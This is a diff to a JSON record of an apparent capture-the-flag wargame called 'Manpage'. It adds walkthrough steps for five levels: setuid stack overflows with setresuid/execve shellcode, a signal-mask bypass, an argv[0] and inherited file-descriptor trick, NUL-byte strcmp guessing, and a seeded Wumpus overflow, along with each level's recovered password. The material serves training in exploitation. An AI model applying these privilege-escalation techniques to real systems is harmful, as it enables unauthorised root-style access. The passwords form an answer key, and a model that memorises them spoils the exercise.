@@ -25,7 +25,33 @@
     "Mu8GvMudHb"
    ],
    "pw": "Mu8GvMudHb",
-   "user": "manpage0"
+   "user": "manpage0",
+   "steps": [
+    {
+     "cmd": "cat /manpage/manpage0.c"
+    },
+    {
+     "cmd": "# setuid binary: setuid(getuid()); strcpy(buf[256], argv[1]) \u2014 classic overflow, saved set-user-ID still holds manpage1"
+    },
+    {
+     "cmd": "gdb /manpage/manpage0   # find buf on the stack; EIP offset = 260 (ASLR off, stack executable)"
+    },
+    {
+     "cmd": "python3 exp0.py   # payload: NOP sled + setresuid(17001,17001,17001) + execve(\"/bin/sh\") shellcode, ret addr into buf"
+    },
+    {
+     "cmd": "id",
+     "out": [
+      "uid=17001(manpage1) gid=17000(manpage0) groups=17000(manpage0)"
+     ]
+    },
+    {
+     "cmd": "cat /etc/manpage_pass/manpage1",
+     "out": [
+      "Mu8GvMudHb"
+     ]
+    }
+   ]
   },
   {
    "cmds": [
@@ -41,7 +67,24 @@
     "m2uPltjqCJ"
    ],
    "pw": "m2uPltjqCJ",
-   "user": "manpage1"
+   "user": "manpage1",
+   "steps": [
+    {
+     "cmd": "cat /manpage/manpage1.c"
+    },
+    {
+     "cmd": "# same strcpy overflow, but strlen(buf)>=255 -> raise(SIGTERM) after the copy"
+    },
+    {
+     "cmd": "python3 exp1b.py"
+    },
+    {
+     "cmd": "# parent blocks SIGTERM (inherited mask -> raise() never delivers); overflow to setresuid(17002)+execve(\"/bin/cat\", \"/etc/manpage_pass/manpage2\") shellcode",
+     "out": [
+      "m2uPltjqCJ"
+     ]
+    }
+   ]
   },
   {
    "cmds": [
@@ -58,7 +101,24 @@
     "FD3: b'A8CLKp6IDp\\n'"
    ],
    "pw": "A8CLKp6IDp",
-   "user": "manpage2"
+   "user": "manpage2",
+   "steps": [
+    {
+     "cmd": "cat /manpage/manpage2.c"
+    },
+    {
+     "cmd": "# getpass check vs file, then setuid(getuid()) and execl(argv[0], argv[0], argv[1]) with argv[1][0] as a counter"
+    },
+    {
+     "cmd": "python3 exp2d.py"
+    },
+    {
+     "cmd": "# launch with executable=/manpage/manpage2 but argv[0]=\"/bin/sh\", argv[1]=\"\\x81\"; plant a script file named byte 0x82 in cwd"
+    },
+    {
+     "cmd": "# after one wrong guess the binary execs /bin/sh \"\\x82\" -> our script: lseek(fd3,0,0) + read -> the still-open password FILE* from the privileged run"
+    }
+   ]
   },
   {
    "cmds": [
@@ -76,7 +136,27 @@
     "8O96CWQPaN"
    ],
    "pw": "8O96CWQPaN",
-   "user": "manpage3"
+   "user": "manpage3",
+   "steps": [
+    {
+     "cmd": "cat /manpage/manpage3.c"
+    },
+    {
+     "cmd": "# strcmp(stdin_line, 256 random bytes from /manpage/manpage3-pw/password); /manpage/manpage3-reset regenerates it from /dev/urandom"
+    },
+    {
+     "cmd": "python3 exp3b.py"
+    },
+    {
+     "cmd": "# loop: reset, then guess a line starting with a NUL byte; strcmp matches when the random file starts with 0x00 (1/256)"
+    },
+    {
+     "cmd": "cat /etc/manpage_pass/manpage4   # inside the won shell, fed after a delay",
+     "out": [
+      "8O96CWQPaN"
+     ]
+    }
+   ]
   },
   {
    "cmds": [
@@ -96,7 +176,33 @@
     "v2ltdizZfm"
    ],
    "pw": "v2ltdizZfm",
-   "user": "manpage4"
+   "user": "manpage4",
+   "steps": [
+    {
+     "cmd": "cat /manpage/manpage4.diff   # patched Wumpus: log_winner() sprintf's ctime+firstname+lastname (uninitialized 256B name buffers) into buf[256]"
+    },
+    {
+     "cmd": "python3 exp4g.py /manpage/manpage4"
+    },
+    {
+     "cmd": "# seed -s 12345: replicate host libc rand() -> layout player=18 wumpus=13 pits={2,16} bats={5,3}; move 18->19->20, shoot 1 room: 13"
+    },
+    {
+     "cmd": "# the ROOM # line persists in getnum's stack buffer overlapping the name buffers: NOP sled + setresuid(17005)+execve shellcode inside the lastname span, saved-RET dword = &buf+64; answer 'AAAA' at the name prompt"
+    },
+    {
+     "cmd": "id",
+     "out": [
+      "uid=17005(manpage5) gid=17004(manpage4) groups=17004(manpage4)"
+     ]
+    },
+    {
+     "cmd": "cat /etc/manpage_pass/manpage5",
+     "out": [
+      "v2ltdizZfm"
+     ]
+    }
+   ]
   }
  ],
  "title": "Manpage"
